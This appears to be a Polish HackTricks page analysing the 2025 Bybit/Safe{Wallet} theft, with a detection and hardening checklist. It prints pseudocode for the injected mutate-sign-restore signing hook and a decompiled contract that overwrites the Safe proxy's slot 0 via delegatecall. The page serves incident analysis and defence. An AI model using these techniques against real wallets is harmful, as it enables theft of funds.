# Kompromitacja procesu podpisywania Web3 i przejęcie proxy Safe za pomocą Delegatecall

{{#include ../../banners/hacktricks-training.md}}

## Przegląd

Łańcuch kradzieży z cold walleta połączył **kompromitację łańcucha dostaw interfejsu webowego Safe{Wallet}** z **on-chain prymitywem delegatecall, który nadpisał wskaźnik implementacji proxy (slot 0)**. Najważniejsze wnioski:

- Jeśli dApp może wstrzyknąć kod do procesu podpisywania, może sprawić, że signer wygeneruje prawidłowy **podpis EIP-712 dla pól wybranych przez attackera**, jednocześnie przywracając oryginalne dane interfejsu, aby inni signerzy nie zdawali sobie z tego sprawy.
- Proxy Safe przechowują `masterCopy` (implementację) w **storage slot 0**. Delegatecall do kontraktu, który zapisuje do slotu 0, skutecznie „aktualizuje” Safe do logiki attackera, zapewniając pełną kontrolę nad walletem.

## Off-chain: Ukierunkowana modyfikacja podpisywania w Safe{Wallet}

Zmodyfikowany bundle Safe (`_app-*.js`) selektywnie atakował określone adresy Safe i signerów. Wstrzyknięta logika wykonywała się bezpośrednio przed wywołaniem podpisywania:<sup>[[1]](#references)[[3]](#references)</sup>
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Właściwości ataku
- **Context-gated**: hard-coded allowlists dla docelowych Safe/signers ograniczały szum i obniżały wykrywalność.<sup>[[1]](#references)[[3]](#references)</sup>
- **Last-moment mutation**: pola (`to`, `data`, `operation`, gas) były nadpisywane bezpośrednio przed `signTransaction`, a następnie przywracane, dlatego payloady propozycji w UI wyglądały niewinnie, podczas gdy signatures odpowiadały payloadowi atakującego.
- **EIP-712 opacity**: wallets wyświetlały dane strukturalne, ale nie dekodowały zagnieżdżonego calldata ani nie wyróżniały `operation = delegatecall`, przez co zmodyfikowana wiadomość była w praktyce podpisywana bez weryfikacji.

### Znaczenie walidacji Gateway
Propozycje Safe są przesyłane do **Safe Client Gateway**. Przed wprowadzeniem wzmocnionych kontroli gateway mógł zaakceptować propozycję, w której `safeTxHash`/signature odpowiadały innym polom niż te w JSON-ie, jeśli UI przepisał je po podpisaniu. Po incydencie gateway odrzuca teraz propozycje, których hash/signature nie odpowiadają przesłanej transakcji. Podobna server-side hash verification powinna być wymuszana w każdym signing-orchestration API.

### Najważniejsze informacje o incydencie Bybit/Safe z 2025 roku
- Drenaż cold-walleta Bybit z 21 lutego 2025 roku (~401k ETH) wykorzystywał ten sam wzorzec: przejęty bundle Safe S3 uruchamiał się wyłącznie dla signerów Bybit i zamieniał `operation=0` → `1`, kierując `to` na wcześniej wdrożony kontrakt atakującego, który zapisuje slot 0.<sup>[[1]](#references)[[3]](#references)</sup>
- Zapisany w Wayback `_app-52c9031bfa03da47.js` pokazuje logikę opartą na Safe Bybit (`0x1db9…cf4`) i adresach signerów, po czym natychmiast przywracał czysty bundle dwie minuty po wykonaniu, odtwarzając trik „mutate → sign → restore”.<sup>[[1]](#references)[[2]](#references)</sup>
- Złośliwy kontrakt (np. `0x9622…c7242`) zawierał proste funkcje `sweepETH/sweepERC20` oraz `transfer(address,uint256)`, która zapisuje slot implementacji. Wykonanie `execTransaction(..., operation=1, to=contract, data=transfer(newImpl,0))` zmieniało implementację proxy i zapewniało pełną kontrolę.<sup>[[1]](#references)[[3]](#references)</sup>

## On-chain: przejęcie proxy przez Delegatecall za pośrednictwem kolizji slotów

Proxy Safe przechowują `masterCopy` w **storage slot 0** i delegują całą logikę do niego. Ponieważ Safe obsługuje **`operation = 1` (delegatecall)**, każda podpisana transakcja może wskazywać dowolny kontrakt i wykonywać jego kod w kontekście storage proxy.<sup>[[3]](#references)</sup>

Kontrakt atakującego naśladował `transfer(address,uint256)` ERC-20, ale zamiast tego zapisywał `_to` do slotu 0:<sup>[[1]](#references)[[3]](#references)</sup>
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Ścieżka wykonania:<sup>[[1]](#references)[[3]](#references)</sup>
1. Ofiary podpisują `execTransaction` z `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. Safe masterCopy weryfikuje podpisy dla tych parametrów.
3. Proxy wykonuje delegatecall do `attackerContract`; ciało `transfer` zapisuje slot 0.
4. Slot 0 (`masterCopy`) wskazuje teraz na logikę kontrolowaną przez attackera → **pełne przejęcie walleta i opróżnienie środków**.

### Uwagi dotyczące Guard i wersji (hardening po incydencie)
- Safes >= v1.3.0 mogą zainstalować **Guard**, aby odrzucać `delegatecall` lub egzekwować ACL dla `to`/selectorów; Bybit korzystał z v1.1.1, więc nie istniał hook Guard. Upgrade kontraktów (i ponowne dodanie ownerów) jest wymagany, aby uzyskać tę warstwę kontroli.

## Lista kontrolna wykrywania i hardeningu

- **Integralność UI**: przypinaj assety JS / SRI; monitoruj różnice między bundle'ami; traktuj signing UI jako część granicy zaufania.
- **Walidacja w czasie podpisywania**: hardware wallets z **EIP-712 clear-signing**; jawnie wyświetlaj `operation` i dekoduj zagnieżdżone calldata. Odrzucaj podpisywanie, gdy `operation = 1`, chyba że zezwala na to policy.
- **Sprawdzanie hashy po stronie serwera**: gatewaye/usługi przekazujące proposals muszą ponownie obliczyć `safeTxHash` i zweryfikować, czy podpisy odpowiadają przesłanym polom.
- **Policy/allowlisty**: reguły preflight dla `to`, selectorów i typów assetów oraz blokowanie delegatecall z wyjątkiem zweryfikowanych flow. Wymagaj wewnętrznej usługi policy przed broadcastem w pełni podpisanych transakcji.
- **Projektowanie kontraktów**: unikaj udostępniania arbitralnego delegatecall w walletach multisig/treasury, chyba że jest to bezwzględnie konieczne. Umieszczaj wskaźniki upgrade poza slotem 0 lub zabezpieczaj je jawną logiką upgrade i kontrolą dostępu.
- **Monitoring**: generuj alerty dotyczące wykonań delegatecall z walletów przechowujących środki treasury oraz proposals zmieniających `operation` względem typowych wzorców `call`.

## References

- [1] [AnChain.AI forensic breakdown of the Bybit Safe exploit](https://www.anchain.ai/blog/bybit)
- [2] [Zero Hour Technology analysis of the Safe bundle compromise](https://www.panewslab.com/en/articles/7r34t0qk9a15)
- [3] [In-depth technical analysis of the Bybit hack (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [4] [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [5] [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
